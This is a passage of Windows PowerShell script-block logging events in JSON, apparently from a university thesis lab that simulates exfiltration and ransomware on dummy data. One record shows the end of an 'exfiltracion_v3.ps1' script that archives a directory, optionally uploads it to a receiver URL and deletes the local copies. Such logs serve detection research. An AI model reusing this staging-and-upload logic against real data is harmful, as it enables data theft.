\"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n\n\nId. de bloque de script: 622fc977-93d2-4ba5-b172-df52bf57b8a9\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:36.173790454Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3287895,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862976.1737905},"EventRecordID":3287895,"Correlation":{"ActivityID":"F2694954-11F0-0001-FB24-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"74fa929c-1b11-49ea-93a6-14ec9bab1536","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: 74fa929c-1b11-49ea-93a6-14ec9bab1536\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:41.735371112Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3288061,"Details":"ScriptBlock: $Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862981.735371},"EventRecordID":3288061,"Correlation":{"ActivityID":"F2694954-11F0-0001-8825-6FF2F011DD01"},"Execution":{"ProcessID":3480,"ThreadID":5124},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","ScriptBlockId":"6208b22b-14c9-4e1e-ae20-39da1ca7dde7","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"\n\nId. de bloque de script: 6208b22b-14c9-4e1e-ae20-39da1ca7dde7\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:41.8884449Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3288065,"Details":"ScriptBlock: {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862981.888445},"EventRecordID":3288065,"Correlation":{"ActivityID":"F2694954-11F0-0003-4523-6FF2F011DD01"},"Execution":{"ProcessID":3480,"ThreadID":5124},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","ScriptBlockId":"43a452c6-137c-4429-920a-ebba339880d5","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\n\nId. de bloque de script: 43a452c6-137c-4429-920a-ebba339880d5\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:30:03.069510459Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3291071,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783863003.0695105},"EventRecordID":3291071,"Correlation":{"ActivityID":"F2694954-11F0-0001-E231-6FF2F011DD01"},"Execution":{"ProcessID":3480,"ThreadID":5124},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"d506b957-49e0-4b71-8a8f-82d488869577","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: d506b957-49e0-4b71-8a8f-82d488869577\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:30:20.078468799Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3291095,"Details":"ScriptBlock: $Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783863020.0784688},"EventRecordID":3291095,"Correlation":{"ActivityID":"F2694954-11F0-0000-270A-6CF2F011DD01"},"Execution":{"ProcessID":3060,"ThreadID":12148},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","ScriptBlockId":"ce8e18ce-d2af-43ea-a331-ce0d4c26ce62","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"\n\nId. de bloque de script: ce8e18ce-d2af-43ea-a331-ce0d4c26ce62\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:30:20.235083103Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3291099,"Details":"ScriptBlock: {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783863020.235083},"EventRecordID":3291099,"Correlation":{"ActivityID":"F2694954-11F0-0001-2533-6FF2F011DD01"},"Execution":{"ProcessID":3060,"ThreadID":12148},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","ScriptBlockId":"1e981f33-16fe-439f-9bd0-188dbb1f00f3","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\n\nId. de bloque de script: 1e981f33-16fe-439f-9bd0-188dbb1f00f3\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:30:38.686196804Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3294105,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783863038.6861968},"EventRecordID":3294105,"Correlation":{"ActivityID":"F2694954-11F0-0003-5241-6FF2F011DD01"},"Execution":{"ProcessID":3060,"ThreadID":12148},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"c52fe3d5-aaec-4679-b420-89870ca0038b","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: c52fe3d5-aaec-4679-b420-89870ca0038b\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
